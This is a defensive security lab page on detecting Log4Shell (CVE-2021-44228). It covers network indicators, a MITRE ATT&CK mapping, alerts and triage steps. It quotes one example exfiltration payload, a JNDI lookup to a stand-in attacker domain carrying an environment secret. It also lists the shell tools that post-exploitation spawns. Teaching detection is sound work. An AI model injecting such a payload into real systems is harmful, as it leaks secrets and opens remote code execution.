# Lab 6.9: Case Study: Log4Shell (CVE-2021-44228)

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <a href="../analyze/" class="phase-step done">Analyze</a>
  <span class="phase-arrow">›</span>
  <a href="../lessons/" class="phase-step done">Lessons</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Detect</span>
</div>

<div class="no-terminal-notice">Reference material. No terminal needed.</div>

## Finding Log4Shell in the Wild

WAF rules detect JNDI patterns including obfuscation, but new bypasses were discovered daily. The only real fix is upgrading Log4j.

**Key network indicators:**

- Outbound LDAP to non-internal servers (TCP 389, 636, or non-standard ports)
- Outbound RMI connections (TCP 1099)
- DNS queries with encoded data (`${jndi:dns://attacker.com/${env:SECRET}}`)
- Java process spawning shell commands post-exploitation

| Indicator | Description |
|-----------|-------------|
| `java` making outbound LDAP | JNDI lookup triggered by exploit |
| `java` spawning `bash`, `curl`, `wget` | Post-exploitation command execution |
| New `.class` files in `/tmp/` from `java` | Downloaded malicious class from LDAP |
| High DNS query rate from `java` | DNS-based JNDI data exfiltration |

### MITRE ATT&CK Mapping

| Technique | ID | Relevance |
|-----------|-----|-----------|
| **Supply Chain Compromise: Software Supply Chain** | [T1195.002](https://attack.mitre.org/techniques/T1195/002/) | Log4j as a ubiquitous transitive dependency exploited at scale |
| **Exploit Public-Facing Application** | [T1190](https://attack.mitre.org/techniques/T1190/) | JNDI injection via any logged input field |
| **Command and Scripting Interpreter: Unix Shell** | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) | Post-exploitation: JNDI loads a malicious Java class that spawns shell commands |

**Alerts:** "JNDI injection pattern detected" (WAF/IDS), "Outbound LDAP from application server" (firewall/NDR), "Java process spawned shell command" (EDR), "DNS query with encoded data" (DNS monitoring).

During the initial response, SOCs were overwhelmed by scanning volume (both attackers and defenders testing). Obfuscation bypasses outpaced WAF rule updates. Focus on **successful exploitation indicators** (outbound LDAP connections, post-exploitation processes) rather than injection attempts.

**Triage steps:**

1. Check if Log4j 2.x (<2.17.1) is in the dependency tree via SBOM
2. Analyze the JNDI callback URL from WAF/IDS logs
3. Check for outbound LDAP/RMI from the app server
4. Check for post-exploitation child processes from java/tomcat
5. If exploited: assume full compromise and isolate

---

## What You Learned

- **Log4Shell was a supply chain vulnerability.** Log4j arrived as a transitive dependency nobody chose. SBOM would have reduced response time from days to minutes.
- **Any logged user input was an RCE vector.** JNDI lookup in a logging library created a nearly universal attack surface.
- **First patches are not always the last.** Four CVEs in three weeks. Fast-path patching and automated deployment are essential.

## Further Reading

- [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
- [CISA: Apache Log4j Vulnerability Guidance](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a)
- [LunaSec: Log4Shell Explained](https://www.lunasec.io/docs/blog/log4j-zero-day/)

See also: [Detection Rule Library](../../../resources/detection-rules.md) | [CI Security Snippets](../../../resources/ci-snippets.md)
